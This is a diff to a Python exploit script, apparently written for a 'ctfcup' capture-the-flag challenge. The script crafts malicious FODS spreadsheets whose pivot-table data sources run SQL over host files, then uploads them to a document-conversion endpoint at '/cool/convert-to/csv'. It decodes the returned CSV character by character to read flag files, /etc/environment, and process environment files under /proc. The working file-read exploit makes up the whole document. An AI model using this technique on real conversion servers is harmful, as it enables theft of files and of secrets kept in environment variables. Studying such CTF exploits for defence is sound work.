@@ -208,9 +208,14 @@ def print_saved(docid, query):
         print("\n=== SAVED_DOCUMENT ===\n" + raw.decode("utf-8", "replace"), flush=True)
 
 
-def pivot_definition(name, url, table, positions, target):
-    selects = [f'ASCII(SUBSTRING(C1,{i},1)) AS X{i}' for i in positions]
+def pivot_definition(name, url, table, positions, target, locate_flag=False):
+    if locate_flag:
+        selects = [f"ASCII(SUBSTRING(C1,LOCATE('ctfcup',C1)+{i - 1},1)) AS X{i}" for i in positions]
+    else:
+        selects = [f'ASCII(SUBSTRING(C1,{i},1)) AS X{i}' for i in positions]
     statement = f'SELECT {", ".join(selects)} FROM "{table}"'
+    if locate_flag:
+        statement += " WHERE C1 LIKE '%ctfcup%'"
     fields = []
     for i in positions:
         selected = ' table:selected-page="force-cache"' if i == positions[0] else ''
@@ -270,9 +275,70 @@ def convert(data):
     print("PIVOT_DECODED", decoded, flush=True)
 
 
+def make_search_fods(candidates):
+    positions = list(range(1, 49))
+    rows = []
+    pivots = []
+    for index, (label, url, table) in enumerate(candidates):
+        start = 100 + index * 20
+        target_cell = f'Z{start}'
+        target_range = f'Sheet1.Z{start}:Sheet1.CV{start + 10}'
+        cells = []
+        for i in positions:
+            formula = f'of:=GETPIVOTDATA("X{i}";[.{target_cell}])'
+            cells.append(f'<table:table-cell table:formula="{html.escape(formula, quote=True)}" office:value-type="float" office:value="0"/>')
+        rows.append(f'<table:table-row>{"".join(cells)}</table:table-row>')
+        pivots.append(pivot_definition(f'Pivot{index}', url, table, positions, target_range, locate_flag=True))
+    return f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
+<office:body><office:spreadsheet><table:table table:name="Sheet1">{''.join(rows)}</table:table>
+<table:data-pilot-tables>{''.join(pivots)}</table:data-pilot-tables>
+</office:spreadsheet></office:body></office:document>'''.encode()
+
+
+def convert_search(candidates, data):
+    boundary = "----Arena" + uuid.uuid4().hex
+    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="data"; filename="probe.fods"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode() + data + f"\r\n--{boundary}--\r\n".encode())
+    status, _, raw, _ = req("/cool/convert-to/csv", "POST", body, {"Content-Type": "multipart/form-data; boundary=" + boundary}, limit=10000000)
+    text = raw.decode("utf-8", "replace")
+    print("\n=== SEARCH_CSV STATUS", status, "===\n" + text, flush=True)
+    lines = text.splitlines()
+    for index, (label, _, _) in enumerate(candidates):
+        cells = lines[index].split(',') if index < len(lines) else []
+        codes = []
+        for cell in cells[:48]:
+            try:
+                codes.append(int(float(cell.strip().strip('"'))))
+            except ValueError:
+                codes.append(-1)
+        decoded = ''.join(chr(n) if 0 < n < 128 else '?' for n in codes)
+        print("SEARCH_RESULT", label, "CODES", codes, "DECODED", decoded, flush=True)
+
+
 def main():
     req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
-    convert(make_pivot_fods(source_url("d4"), source_url("d6")))
+    root = source_url("d4")
+    etc = source_url("d5")
+    proc_root = host_odb("proc1-root", "/proc/1/root")
+    proc_self = host_odb("proc-self", "/proc/self")
+    proc_one = host_odb("proc-one", "/proc/1")
+    tmp = host_odb("tmp-files", "/tmp")
+    app = host_odb("app-files", "/app")
+    candidates = [
+        ("root-flag.txt", root, "flag.txt"),
+        ("root-FLAG", root, "FLAG"),
+        ("proc1-root-flag", proc_root, "flag"),
+        ("proc-self-environ", proc_self, "environ"),
+        ("proc1-environ", proc_one, "environ"),
+        ("etc-environment", etc, "environment"),
+        ("etc-flag", etc, "flag"),
+        ("etc-flag.txt", etc, "flag.txt"),
+        ("tmp-flag", tmp, "flag"),
+        ("tmp-flag.txt", tmp, "flag.txt"),
+        ("app-flag", app, "flag"),
+        ("app-flag.txt", app, "flag.txt"),
+    ]
+    convert_search(candidates, make_search_fods(candidates))
 
 
 if __name__ == "__main__":
